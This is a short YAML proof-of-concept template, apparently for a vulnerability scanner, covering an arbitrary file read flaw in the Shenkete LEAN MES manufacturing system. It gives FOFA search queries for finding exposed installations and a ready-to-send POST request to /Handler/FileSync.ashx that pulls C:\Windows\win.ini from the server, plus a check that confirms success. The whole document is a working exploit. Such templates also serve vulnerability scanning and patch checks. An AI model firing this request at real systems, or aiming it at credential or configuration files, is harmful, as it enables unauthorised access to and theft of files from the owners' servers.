id: poc-yaml-skt-lean-mes-filesync-ashx-anyfile-read
info:
  name: 深科特 LEAN MES系统 FileSync.ashx 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: lean-mes
  fofa_1: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js"
  fofa_2: body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
requests:
- method: POST
  path: /Handler/FileSync.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: type=DownLoad&sourceFileUrl=C:\\Windows\\win.ini
  expression: status_code == 200 && contains(body,"[fonts]") && contains(body,"bit
    app support") && contains(headers,"filename=win.ini") && contains(content_type,"application/octet-stream")
variables: {}
transport: http
